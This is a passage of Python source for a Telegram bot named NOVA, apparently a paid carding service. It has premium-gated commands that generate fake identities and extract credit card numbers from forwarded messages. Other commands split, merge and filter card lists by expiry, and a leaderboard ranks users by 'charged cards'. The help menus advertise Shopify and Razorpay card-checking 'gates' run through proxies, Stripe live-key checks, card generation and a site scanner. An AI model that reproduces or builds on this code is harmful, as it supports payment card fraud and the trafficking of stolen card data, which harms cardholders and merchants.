    'FJ': {'name':'Fiji','phone_code':'+679','len':7,
        'cities':[('Suva','C','0000'),('Nadi','W','0000')],
        'streets':['Victoria Parade','Queen Elizabeth Drive'],
        'first':['Semi','Ratu','Josaia','Epeli','Ilaisa'],
        'last':['Naitasiri','Cakobau','Rabuka','Vakatora']},
}


def _fake_resolve(code):
    code = (code or '').strip().upper()
    return code if code in FAKE_DATA else None


def _fake_phone(code):
    d = FAKE_DATA[code]
    n = d['len']
    if code in ('US', 'CA'):
        area = str(random.randint(2, 9)) + ''.join(str(random.randint(0, 9)) for _ in range(2))
        mid  = str(random.randint(2, 9)) + ''.join(str(random.randint(0, 9)) for _ in range(2))
        last = ''.join(str(random.randint(0, 9)) for _ in range(4))
        return f"({area}) {mid}-{last}"
    digits = ''.join(str(random.randint(0, 9)) for _ in range(n))
    return f"{d['phone_code']} {digits[:n//2]} {digits[n//2:]}"


@client.on(events.NewMessage(pattern=r'^[/.]fake(?:\s+(.+))?$'))
async def cmd_fake(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)

    arg = (event.pattern_match.group(1) or '').strip()

    if not arg or arg.lower() == 'list':
        codes = sorted(FAKE_DATA.keys())
        half = (len(codes) + 1) // 2
        left  = "  ".join(f"<code>{c}</code>" for c in codes[:half])
        right = "  ".join(f"<code>{c}</code>" for c in codes[half:])
        return await styled_reply(event, pe(
            f"🌍 <b>{bs('Fake Identity Generator')}</b>\n{SEP}\n"
            f"✨ {bs('Countries')} (<code>{len(codes)}</code>):\n\n{left}\n{right}\n\n{SEP}\n"
            f"💡 <b>{bs('Usage')}</b>: <code>/fake US</code> · <code>/fake list</code> · <code>/fake random</code>"
        ))

    if arg.lower() == 'random':
        code = random.choice(list(FAKE_DATA.keys()))
    else:
        code = _fake_resolve(arg)
        if not code:
            return await styled_reply(event, pe(
                f"❌ <b>{bs('Unknown country')}</b>: <code>{arg}</code>\n"
                f"💡 {bs('Use')} <code>/fake list</code>"
            ))

    d = FAKE_DATA[code]
    first  = random.choice(d['first'])
    last   = random.choice(d['last'])
    city, state, zip_c = random.choice(d['cities'])
    street = f"{random.choice(d['streets'])} {random.randint(1, 9999)}"
    phone  = _fake_phone(code)

    await styled_reply(event, pe(
        f"👤 <b>{bs('Full Name')}</b> ⌁ <code>{first} {last}</code>\n"
        f"🏠 <b>{bs('Street')}</b> ⌁ <code>{street}</code>\n"
        f"🏙️ <b>{bs('City')}</b> ⌁ <code>{city}</code>\n"
        f"📍 <b>{bs('State')}</b> ⌁ <code>{state}</code>\n"
        f"🌍 <b>{bs('Country')}</b> ⌁ <code>{d['name']}</code>\n"
        f"📮 <b>{bs('Zip')}</b> ⌁ <code>{zip_c}</code>\n"
        f"📞 <b>{bs('Phone')}</b> ⌁ <code>{phone}</code>\n"
        f"{SEP}\n"
        f"💎 <i>{bs('Generated by NOVA')}</i>"
    ))


# ====================== IP / IBAN ======================
@client.on(events.NewMessage(pattern=r'^[/.]ip\s+'))
async def cmd_ip(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/ip 8.8.8.8</code>"))
    ip = parts[1].strip()
    try:
        session = await get_http_session()
        async with session.get(f'http://ip-api.com/json/{ip}',
                               timeout=aiohttp.ClientTimeout(total=10)) as r:
            data = await r.json(content_type=None)
        if data.get('status') == 'fail':
            return await styled_reply(event, pe(f"❌ <b>{bs('Invalid IP')}</b>"))
        await styled_reply(event, pe(
            f"🌐 <b>{bs('IP Lookup')}</b>\n{SEP}\n📌 <code>{ip}</code>\n"
            f"🌍 {data.get('country', '-')}\n🏙️ {data.get('city', '-')}\n"
            f"📍 {data.get('regionName', '-')}\n📮 <code>{data.get('zip', '-')}</code>\n"
            f"📊 {data.get('isp', '-')}\n📱 {data.get('mobile', False)}\n"
            f"🏦 {data.get('proxy', False)}\n🗺️ {data.get('lat', '-')}, {data.get('lon', '-')}"
        ))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


def _iban_valid(iban: str) -> bool:
    iban = iban.replace(' ', '').upper()
    if not re.match(r'^[A-Z]{2}\d{2}[A-Z0-9]{1,30}$', iban):
        return False
    rearranged = iban[4:] + iban[:4]
    num = ""
    for ch in rearranged:
        num += ch if ch.isdigit() else str(ord(ch) - 55)
    return int(num) % 97 == 1


@client.on(events.NewMessage(pattern=r'^[/.]iban\s+'))
async def cmd_iban(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/iban GB82WEST12345698765432</code>"))
    iban = parts[1].strip()
    ok = _iban_valid(iban)
    await styled_reply(event, pe(
        f"🏦 <b>{bs('IBAN Validation')}</b>\n{SEP}\n"
        f"📌 <code>{iban}</code>\n✅ {bs('Status')}: {'Valid' if ok else 'Invalid'}"
    ))


# ====================== FILE TOOLS ======================
@client.on(events.NewMessage(pattern=r'^[/.]split(?:\s+(\d+))?$'))
async def cmd_split(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    m = event.pattern_match.group(1)
    chunk_size = 1000
    if m:
        try:
            chunk_size = int(m)
        except ValueError:
            chunk_size = 1000
    if chunk_size < 50: chunk_size = 50
    if chunk_size > 100000: chunk_size = 100000

    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Split')}</b>\n{SEP}\n"
            f"💡 {bs('Reply to a .txt file with')}:\n"
            f"<code>/split 1000</code>\n"
            f"<i>{bs('Default')}: 1000 {bs('lines per file')}</i>"
        ))
    reply = await event.get_reply_message()
    if not reply or not reply.file or not (reply.file.name or '').endswith('.txt'):
        return await styled_reply(event, pe(f"💎 {bs('Reply to a .txt file')}"))

    status_msg = await styled_reply(event, pe(
        f"💎 {bs('Splitting')} <code>{chunk_size}</code> {bs('lines per file')}..."
    ))
    path = None
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [ln.rstrip('\n') for ln in (await f.read()).splitlines() if ln.strip()]
    except Exception as e:
        if path and os.path.exists(path):
            try: os.remove(path)
            except Exception: pass
        return await styled_edit(status_msg, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))
    if path and os.path.exists(path):
        try: os.remove(path)
        except Exception: pass

    if not lines:
        return await styled_edit(status_msg, pe(f"💎 <b>{bs('File empty')}</b>"))
    chunks = [lines[i:i + chunk_size] for i in range(0, len(lines), chunk_size)]
    total = len(chunks)
    sent = 0
    for i, ch in enumerate(chunks, 1):
        fname = f"NOVA_split_{i}_{datetime.now().strftime('%H%M%S')}.txt"
        async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
            for ln in ch:
                await f.write(ln + "\n")
        try:
            await send_file_entities(uid, fname,
                pe(f"📁 {bs('Part')} {i}/{total} · <code>{len(ch)}</code> {bs('lines')}"))
            sent += 1
        except Exception as e:
            log_system("SPLIT", f"send part {i} failed: {e}", "error")
        try: os.remove(fname)
        except Exception: pass
        if sent % 5 == 0:
            try:
                await status_msg.edit(pe(f"💎 {bs('Splitting')} — <code>{i}/{total}</code>"),
                                      parse_mode='html', link_preview=False)
            except Exception:
                pass
    await styled_edit(status_msg, pe(
        f"✅ <b>{bs('Split complete')}</b>\n{SEP}\n"
        f"📁 {bs('Total lines')}: <code>{len(lines)}</code>\n"
        f"🧩 {bs('Chunks')}: <code>{total}</code>\n"
        f"📏 {bs('Size')}: <code>{chunk_size}</code> {bs('lines/file')}"
    ))


MERGE_DATA = {}


@client.on(events.NewMessage(pattern=r'^[/.]merge$'))
async def cmd_merge(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    if uid in MERGE_DATA:
        return await styled_reply(event, pe(f"💎 {bs('Already active')}"))
    MERGE_DATA[uid] = []
    await styled_reply(event, pe(
        f"💎 <b>{bs('Merge ON')}</b>\n{SEP}\n"
        f"{bs('Send .txt files')}\n{bs('Then')} <code>/donemerge</code>\n"
        f"{bs('Cancel')} <code>/cancelmerge</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]donemerge$'))
async def cmd_donemerge(event):
    uid = event.sender_id
    if uid not in MERGE_DATA:
        return
    files = MERGE_DATA.pop(uid)
    if not files:
        return await styled_reply(event, pe(f"💎 {bs('No files')}"))
    merged_lines = []
    for fp in files:
        try:
            async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                merged_lines.extend(await f.readlines())
            os.remove(fp)
        except Exception:
            pass
    fname = f"NOVA_merged_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
        for ln in merged_lines:
            await f.write(ln if ln.endswith("\n") else ln + "\n")
    await send_file_entities(uid, fname,
        pe(f"✅ {bs('Merged')} <code>{len(files)}</code> files"))
    os.remove(fname)


@client.on(events.NewMessage(pattern=r'^[/.]cancelmerge$'))
async def cmd_cancelmerge(event):
    uid = event.sender_id
    if uid in MERGE_DATA:
        for fp in MERGE_DATA.pop(uid):
            try: os.remove(fp)
            except Exception: pass
        await styled_reply(event, pe(f"💎 {bs('Cancelled')}"))


@client.on(events.NewMessage(func=lambda e: e.file and e.file.name and e.file.name.endswith('.txt')))
async def merge_listener(event):
    uid = event.sender_id
    if uid not in MERGE_DATA:
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return
    try:
        path = await event.download_media()
        MERGE_DATA[uid].append(path)
        await event.reply(pe(f"✅ {bs('Added')} — <code>{len(MERGE_DATA[uid])}</code>"))
    except Exception:
        pass


COLLECT_DATA = {}


@client.on(events.NewMessage(pattern=r'^[/.]collect$'))
async def cmd_collect(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    if uid in COLLECT_DATA:
        return await styled_reply(event, pe(f"💎 {bs('Already active')}"))
    COLLECT_DATA[uid] = []
    await styled_reply(event, pe(
        f"💎 <b>{bs('Collect ON')}</b>\n{SEP}\n"
        f"{bs('Forward messages with cards')}\n{bs('Then')} <code>/donecollect</code>\n"
        f"{bs('Cancel')} <code>/cancelcollect</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]donecollect$'))
async def cmd_donecollect(event):
    uid = event.sender_id
    if uid not in COLLECT_DATA:
        return
    cards = COLLECT_DATA.pop(uid)
    if not cards:
        return await styled_reply(event, pe(f"💎 {bs('No cards')}"))
    fname = f"NOVA_collected_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
        for c in cards:
            await f.write(c + "\n")
    await send_file_entities(uid, fname,
        pe(f"✅ {bs('Collected')} <code>{len(cards)}</code>"))
    os.remove(fname)


@client.on(events.NewMessage(pattern=r'^[/.]cancelcollect$'))
async def cmd_cancelcollect(event):
    COLLECT_DATA.pop(event.sender_id, None)
    await styled_reply(event, pe(f"💎 {bs('Cancelled')}"))


@client.on(events.NewMessage(func=lambda e: e.forward))
async def collect_listener(event):
    uid = event.sender_id
    if uid not in COLLECT_DATA:
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return
    if event.text:
        cards = extract_cc(event.text)
        if cards:
            COLLECT_DATA[uid].extend(cards)
            await event.reply(pe(f"✅ <code>{len(cards)}</code> — {bs('Total')} <code>{len(COLLECT_DATA[uid])}</code>"))
        else:
            await event.reply(pe(f"💎 {bs('No cards')}"))


@client.on(events.NewMessage(pattern=r'^[/.]clean$'))
async def cmd_clean(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    if uid not in ADMIN_ID and not is_premium(uid):
        return await send_premium_only(event)
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(f"💎 {bs('Reply to .txt')}"))
    reply = await event.get_reply_message()
    if not reply or not reply.file:
        return await styled_reply(event, pe(f"💎 {bs('Reply to .txt')}"))
    try:
        path = await reply.download_media()
        async with aiofiles.open(path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(path)
    except Exception as e:
        return await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))
    cards = extract_cc(content)
    now = datetime.now()
    kept, removed = [], 0
    for c in cards:
        parts = c.split('|')
        if len(parts) != 4:
            removed += 1; continue
        try:
            y = int(parts[2]); m = int(parts[1])
        except ValueError:
            removed += 1; continue
        if y < now.year or (y == now.year and m < now.month):
            removed += 1
        else:
            kept.append(c)
    if not kept:
        return await styled_reply(event, pe(f"💎 <b>{bs('All expired')}</b>"))
    fname = f"NOVA_cleaned_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    async with aiofiles.open(fname, 'w', encoding='utf-8') as f:
        for c in kept:
            await f.write(c + "\n")
    await send_file_entities(uid, fname,
        pe(f"✅ {bs('Kept')} <code>{len(kept)}</code> · {bs('Removed')} <code>{removed}</code>"))
    os.remove(fname)


@client.on(events.NewMessage(pattern=r'^[/.]rank$'))
async def cmd_rank(event):
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    rank = load_rank()
    if not rank:
        return await styled_reply(event, pe(f"💎 {bs('No charged cards yet')}"))
    top = sorted(rank.items(), key=lambda x: int(x[1]), reverse=True)[:10]
    lines = []
    for i, (uid_str, count) in enumerate(top, 1):
        try:
            ent = await client_instance.get_entity(int(uid_str))
            name = ent.first_name or uid_str
        except Exception:
            name = uid_str
        lines.append(f"{i}. <b>{name}</b> — <code>{count}</code>")
    await styled_reply(event, pe(f"🏆 <b>{bs('Top 10')}</b>\n{SEP}\n" + "\n".join(lines)))


# ====================== ADMIN MISC ======================
@client.on(events.NewMessage(pattern=r'^[/.]ping$'))
async def cmd_ping(event):
    t = time.time()
    m = await styled_reply(event, pe("🏓 ..."))
    if m:
        try:
            await m.edit(pe(f"🏓 <b>{bs('Pong')}</b> <code>{(time.time()-t)*1000:.1f}ms</code>"), parse_mode='html')
        except Exception:
            pass


@client.on(events.NewMessage(pattern=r'^[/.]toggle$'))
async def cmd_toggle(event):
    if event.sender_id not in ADMIN_ID:
        return
    cur = get_maintenance()
    set_maintenance(not cur)
    await styled_reply(event, pe(f"💎 {bs('Maintenance')}: {'ON' if not cur else 'OFF'}"))


@client.on(events.NewMessage(pattern=r'^[/.]stats$'))
async def cmd_stats(event):
    if event.sender_id not in ADMIN_ID:
        return
    data = load_premium_users()
    rank = load_rank()
    total_charged = sum(int(v) for v in rank.values()) if rank else 0
    await styled_reply(event, pe(
        f"📊 <b>{bs('Stats')}</b>\n{SEP}\n"
        f"👑 Admins: <code>{len(ADMIN_ID)}</code>\n"
        f"💎 Premium: <code>{len(data)}</code>\n"
        f"🌐 Sites: <code>{len(load_sites())}</code>\n"
        f"🔑 Keys: <code>{len(load_keys())}</code>\n"
        f"💳 Total charged: <code>{total_charged}</code>\n"
        f"🎯 Price filter: <code>${get_min_price():.2f}–${get_threshold():.2f}</code>\n"
        f"🤖 Maintenance: {'ON' if get_maintenance() else 'OFF'}"
    ))


@client.on(events.NewMessage(pattern=r'^[/.]all\s+'))
async def cmd_all(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/all message</code>"))
    msg = parts[1]
    data = load_premium_users()
    sent = 0
    for uid_str in data.keys():
        try:
            await send_entities(int(uid_str), pe(msg))
            sent += 1
            await asyncio.sleep(0.05)
        except Exception:
            pass
    await styled_reply(event, pe(f"✅ {bs('Sent to')} <code>{sent}</code>"))


# ====================== /fb (Premium + Admin only) ======================
@client.on(events.NewMessage(pattern=r'^[/.]fb$'))
async def cmd_fb(event):
    uid = event.sender_id
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    # Premium + Admin gate
    if uid not in ADMIN_ID and not is_premium(uid):
        return await styled_reply(event, pe(
            f"💎 <b>{bs('Premium Only')}</b>\n{SEP}\n"
            f"💎 {bs('Only premium users can use')} <code>/fb</code>\n"
            f"💎 {bs('Redeem a key with')} <code>/redeem KEY</code>"
        ))
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(
            f"💎 {bs('Reply to a media message with')} <code>/fb</code>"
        ))
    reply = await event.get_reply_message()
    if not (reply.media or reply.photo or reply.document or reply.video):
        return await styled_reply(event, pe(
            f"💎 {bs('That message has no media to forward.')}"
        ))
    try:
        await client_instance.forward_messages(GROUP_CHAT_ID, reply)
        await styled_reply(event, pe(f"✅ {bs('Forwarded to group.')}"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]addadmin\s+'))
async def cmd_addadmin(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/addadmin user_id</code>"))
    try:
        t = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    if t in ADMIN_ID:
        return await styled_reply(event, pe(f"💎 <b>{bs('Already admin')}</b>"))
    ADMIN_ID.append(t)
    await styled_reply(event, pe(f"✅ <b>{bs('Admin added')}</b> <code>{t}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]removeadmin\s+'))
async def cmd_removeadmin(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/removeadmin user_id</code>"))
    try:
        t = int(parts[1])
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid ID')}</b>"))
    if t not in ADMIN_ID:
        return await styled_reply(event, pe(f"💎 <b>{bs('Not an admin')}</b>"))
    ADMIN_ID.remove(t)
    await styled_reply(event, pe(f"✅ <b>{bs('Admin removed')}</b> <code>{t}</code>"))


# ====================== VIDEO ======================
@client.on(events.NewMessage(pattern=r'^[/.]setwelcomevideo$'))
async def cmd_setwelcomevideo(event):
    if event.sender_id not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a video')}"))
    reply = await event.get_reply_message()
    if not (reply.video or reply.document):
        return await styled_reply(event, pe(f"💎 {bs('Not a video')}"))
    path = os.path.join(VIDEO_DIR, "welcome.mp4")
    try:
        await client_instance.download_media(reply, path)
        await styled_reply(event, pe(f"✅ {bs('Welcome video set')}"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]addhitvideo$'))
async def cmd_addhitvideo(event):
    if event.sender_id not in ADMIN_ID:
        return
    if not event.reply_to_msg_id:
        return await styled_reply(event, pe(f"💎 {bs('Reply to a video')}"))
    reply = await event.get_reply_message()
    if not (reply.video or reply.document):
        return await styled_reply(event, pe(f"💎 {bs('Not a video')}"))
    fname = f"hit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
    path = os.path.join(VIDEO_DIR, fname)
    try:
        await client_instance.download_media(reply, path)
        await styled_reply(event, pe(f"✅ {bs('Added')} <code>{fname}</code>"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]listhitvideos$'))
async def cmd_listhitvideos(event):
    if event.sender_id not in ADMIN_ID:
        return
    vids = get_hit_videos()
    if not vids:
        return await styled_reply(event, pe(f"💎 {bs('No hit videos')}"))
    lines = [f"{i}. <code>{os.path.basename(v)}</code>" for i, v in enumerate(vids, 1)]
    await styled_reply(event, pe(f"🎬 <b>{bs('Hit videos')}</b> ({len(vids)})\n{SEP}\n" + "\n".join(lines)))


@client.on(events.NewMessage(pattern=r'^[/.]removehitvideo\s+'))
async def cmd_removehitvideo(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2:
        return await styled_reply(event, pe(f"💎 <code>/removehitvideo 1</code>"))
    try:
        idx = int(parts[1]) - 1
    except ValueError:
        return await styled_reply(event, pe(f"💎 <b>{bs('Invalid')}</b>"))
    vids = get_hit_videos()
    if idx < 0 or idx >= len(vids):
        return await styled_reply(event, pe(f"💎 <b>{bs('Out of range')}</b>"))
    try:
        os.remove(vids[idx])
        await styled_reply(event, pe(f"✅ {bs('Removed')} <code>{os.path.basename(vids[idx])}</code>"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


@client.on(events.NewMessage(pattern=r'^[/.]hitvideo$'))
async def cmd_hitvideo(event):
    if event.sender_id not in ADMIN_ID:
        return
    vids = get_hit_videos()
    if not vids:
        return await styled_reply(event, pe(f"💎 {bs('No hit videos')}"))
    try:
        await send_file_entities(event.chat_id, random.choice(vids),
            pe(f"🎬 {bs('Sample')}"))
    except Exception as e:
        await styled_reply(event, pe(f"💎 <b>{bs('Error')}</b>: <code>{e}</code>"))


# ====================== MENUS ======================
def main_menu_buttons(uid=None):
    buttons = [
        [pbtn(bs("🔓 Gates"),  data="gates_menu",  style="success", icon="🔓"),
         pbtn(bs("🔌 Proxy"),  data="proxy_menu",  style="primary", icon="🔌")],
        [pbtn(bs("🛠️ Tools"),  data="tools_menu",  style="primary", icon="🛠️"),
         pbtn(bs("💎 Plans"),  data="plans_pricing", style="success", icon="💎")],
        [pbtn(bs("📩 Support"), url=f"https://t.me/{OWNER_TAG.lstrip('@')}", style="primary", icon="📩"),
         pbtn(bs("❌ Close"),  data="close_menu", style="danger",  icon="❌")],
    ]
    if uid and uid in ADMIN_ID:
        buttons.append([pbtn(bs("👑 Admin Panel"), data="admin_panel", style="success", icon="👑")])
    return buttons


# ====================== WELCOME ======================
@client.on(events.NewMessage(pattern=r'^[/.]start$'))
async def cmd_start(event):
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    uid = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or "User"
    except Exception:
        username = "User"
    if uid in ADMIN_ID: status_text = f"👑 {bs('Admin')}"
    elif is_premium(uid): status_text = f"💎 {bs('Premium')}"
    else: status_text = f"🆓 {bs('Free')}"
    limit_text = bs("Unlimited") if (is_premium(uid) or uid in ADMIN_ID) else "N/A cards/file"

    text = pe(f"""{SEP}
    ✨ {bs('Welcome to NOVA')} ✨
{SEP}
👤 {bs('User')}: @{username}
🆔 {bs('ID')}: <code>{uid}</code>
📊 {bs('Status')}: {status_text}
🎯 {bs('Limit')}: {limit_text}
{SEP}
🔥 {bs('Fast・Accurate・Zero Errors')} 🔥
📌 {bs('Use the buttons below to get started.')}
{SEP}""")

    buttons = main_menu_buttons(uid)
    welcome = get_welcome_video()
    if welcome:
        try:
            wtext, wents = build_entities(text)
            await client_instance.send_file(event.chat_id, welcome,
                caption=wtext, formatting_entities=wents,
                buttons=buttons, supports_streaming=True)
            return
        except Exception:
            pass
    await styled_reply(event, text, buttons=buttons)


@client.on(events.NewMessage(pattern=r'^[/.]cmds$'))
async def cmd_cmds(event):
    if await check_maintenance(event):
        return
    if not await force_join_check(event):
        return
    kb = [
        [pbtn(bs("🛒 Shopify Commands"), data="cmd_shopify", style="primary", icon="🛒")],
        [pbtn(bs("🔴 Razorpay Commands"), data="cmd_razorpay", style="danger", icon="🔴")],
        [pbtn(bs("🔌 Proxy Commands"),   data="cmd_proxy", style="primary", icon="🔌")],
        [pbtn(bs("🌐 Site Commands"),    data="cmd_sites", style="primary", icon="🌐")],
        [pbtn(bs("🛠️ Tools & File Commands"), data="cmd_tools", style="primary", icon="🛠️")],
        [pbtn(bs("👑 Admin Commands"),   data="cmd_admin", style="success", icon="👑")],
        [pbtn(bs("🔙 Back to Menu"),     data="main_menu", style="danger", icon="🔙")],
    ]
    await styled_reply(event, pe(f"💎 {bs('Select a category to see all commands with usage:')}"), buttons=kb)


@client.on(events.CallbackQuery(data=b"cmd_shopify"))
async def cb_cmd_shopify(event):
    await event.answer()
    text = pe(f"""🛒 <b>{bs('Shopify Gate Commands')}</b>
{SEP}
<code>/sh card|mm|yy|cvv</code> ━ {bs('Single card check')}
<code>/msh</code> ━ {bs('Mass check (reply to .txt file) – uses sites.txt')}
{SEP}
💡 <i>{bs('Requires sites + proxies')}</i>""")
    await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="back_cmds", style="danger", icon="🔙")]],
                     parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"cmd_razorpay"))
async def cb_cmd_razorpay(event):
    await event.answer()
    text = pe(f"""🔴 <b>{bs('Razorpay')}</b>
{SEP}
💎 <i>{bs('Temporarily unavailable')}</i>
💎 {bs('Use')} <code>/sh</code> {bs('or')} <code>/msh</code> {bs('instead')}""")
    await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="back_cmds", style="danger", icon="🔙")]],
                     parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"cmd_proxy"))
async def cb_cmd_proxy(event):
    await event.answer()
    text = pe(f"""🔌 <b>{bs('Proxy Management')}</b>
{SEP}
<code>/addproxy</code> ━ {bs('Add proxies')}
<code>/proxy</code> ━ {bs('Check all proxies')}
<code>/chkproxy</code> ━ {bs('Check single proxy')}
<code>/rmproxy</code> ━ {bs('Remove specific proxy')}
<code>/rmproxyindex 1,2,3</code> ━ {bs('Remove by index')}
<code>/clearproxy</code> ━ {bs('Remove all')}
<code>/myproxy</code> ━ {bs('View proxies')}
<code>/getproxy</code> ━ {bs('Download list')}
{SEP}
💡 <i>{bs('Premium only')}</i>""")
    await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="back_cmds", style="danger", icon="🔙")]],
                     parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"cmd_sites"))
async def cb_cmd_sites(event):
    await event.answer()
    text = pe(f"""🌐 <b>{bs('Sites Management')}</b>
{SEP}
<code>/addsites</code> ━ {bs('Upload sites (.txt)')}
<code>/resetsites</code> ━ {bs('Wipe and re-test (.txt)')}
<code>/site</code> ━ {bs('Check & remove dead/expensive')}
<code>/rm</code> ━ {bs('Remove specific site')}
<code>/getsites</code> ━ {bs('Download sites.txt')}
<code>/setthreshold 5</code> ━ {bs('Set MAX price')}
<code>/getthreshold</code> ━ {bs('Show MAX price')}
<code>/setminprice 0.50</code> ━ {bs('Set MIN price')}
<code>/getminprice</code> ━ {bs('Show MIN price')}""")
    await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="back_cmds", style="danger", icon="🔙")]],
                     parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"cmd_tools"))
async def cb_cmd_tools(event):
    await event.answer()
    text = pe(f"""🛠️ <b>{bs('Tools & Files')}</b>
{SEP}
<b>🔍 Tools</b>
<code>/bin 123456</code> ━ {bs('BIN lookup')}
<code>/sk sk_live_...</code> ━ {bs('Stripe key')}
<code>/scg https://site.com</code> ━ {bs('Site scanner')}
<code>/gen 123456 10</code> ━ {bs('Generate cards')}
<code>/fake US</code> ━ {bs('Fake identity')}
<code>/ip 8.8.8.8</code> ━ {bs('IP lookup')}
<code>/iban GB82WEST...</code> ━ {bs('IBAN check')}
{SEP}
<b>📁 File Tools</b>
<code>/split 1000</code> ━ {bs('Split .txt')}
<code>/merge</code> ━ {bs('Merge files')}
<code>/collect</code> ━ {bs('Collect cards')}
<code>/clean</code> ━ {bs('Clean expired')}
{SEP}
<b>📢 Forward</b> (Premium + Admin)
<code>/fb</code> ━ {bs('Forward replied media to group')}""")
    await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="back_cmds", style="danger", icon="🔙")]],
                     parse_mode='html', link_preview=False)


@client.on(events.CallbackQuery(data=b"cmd_admin"))
async def cb_cmd_admin(event):
    if event.sender_id not in ADMIN_ID:
        return await event.answer("Access denied", alert=True)
    await event.answer()
    text = pe(f"""👑 <b>{bs('Admin Panel')}</b>
{SEP}
<b>📋 Premium</b>
<code>/addpremium user_id [days] [cc_limit]</code>
<code>/removepremium user_id</code>
<code>/listpremium</code>
<code>/genkeys amount hours max_users cc_limit [price]</code>
<code>/listkeys</code>
<code>/delkey NOVA_XXXX</code>
{SEP}
<b>🎚 Limits</b>
<code>/setfreelimit daily [cooldown]</code>
<code>/getlimits</code>
<code>/setuserlimit user_id daily</code>
{SEP}
<b>🌐 Sites</b>
<code>/addsites</code> · <code>/resetsites</code> · <code>/site</code> · <code>/rm</code>
<code>/getsites</code> · <code>/setthreshold 5</code> · <code>/setminprice 0.50</code>
{SEP}
<b>📊 Bot</b>
<code>/stats</code> · <code>/status</code> · <code>/ping</code> · <code>/toggle</code>
<code>/all message</code> · <code>/fb</code> · <code>/api</code>
{SEP}
<b>🎬 Videos</b>
<code>/setwelcomevideo</code> · <code>/addhitvideo</code>
<code>/listhitvideos</code> · <code>/removehitvideo N</code> · <code>/hitvideo</code>
{SEP}
<b>👑 Admin</b>
<code>/addadmin user_id</code> · <code>/removeadmin user_id</code>""")
    await event.edit(text, buttons=[[pbtn(bs("🔙 Back"), data="back_cmds", style="danger", icon="🔙")]],
                     parse_mode='html', link_preview=False)


